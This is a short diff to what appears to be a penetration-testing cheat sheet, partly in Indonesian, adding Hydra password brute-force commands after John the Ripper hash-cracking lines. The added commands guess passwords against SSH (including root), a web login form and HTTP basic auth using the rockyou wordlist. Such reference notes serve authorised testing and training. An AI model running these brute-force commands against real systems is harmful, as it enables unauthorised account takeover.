@@ -101,3 +101,13 @@ john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
 john --show hashes.txt
 
 
+HYDRA
+SSH:
+hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.10
+hydra -L users.txt -P passwords.txt -t 4 -V -f ssh://target_ip
+
+Web login:
+hydra -l admin -P rockyou.txt target_ip http-post-form "/login.php:username=^USER^&password=^PASS^:F=Login failed"
+
+Untuk http basic auth:
+hydra -l admin -P rockyou.txt target_ip http-get /admin
